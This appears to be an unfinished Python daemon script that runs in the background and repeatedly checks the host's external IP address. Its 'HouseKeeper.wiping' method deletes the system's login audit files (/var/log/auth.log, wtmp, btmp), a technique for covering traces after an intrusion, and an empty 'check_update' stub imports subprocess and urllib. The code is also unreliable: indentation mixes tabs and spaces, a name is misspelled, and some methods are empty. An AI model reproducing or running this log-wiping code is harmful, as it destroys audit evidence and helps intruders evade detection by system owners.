from __future__ import print_function
import logging
import os
from time import sleep
from daemonize import Daemonize
import ipgetter

WATHCED_FILS = [__file__]

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
logger.propagate = False
fh = logging.FileHandler("/tmp/test.log", "w")
fh.setLevel(logging.DEBUG)
logger.addHandler(fh)
keep_fds = [fh.stream.fileno()]

class HouseKeeper():
    def __init__(self):
        pass

    def wiping(self, delicacy=False):
       
        sshs = ['/var/log/auth.log', '/var/log/wtmp', '/var/log/btmp']
	ftps = ['']
        commands = ['']

       	for ssh in sshs:

            if delicacy:
                ssh_file = open(ssh, 'r')
            else:
                os.remove(ssh)    
        
        for ftp in ftps:
            pass

    def check_update(self):
        import urllib
        import re
        from subprocess import call
        
    
def main():
    while True:
	external_ip = ipgetter.myip()	

        sleep(5)

daemon = Daemonize(app="daemon", pid="/tmp/daemon.pid", action=main, keep_fds=keep_fds)
daemon.start()
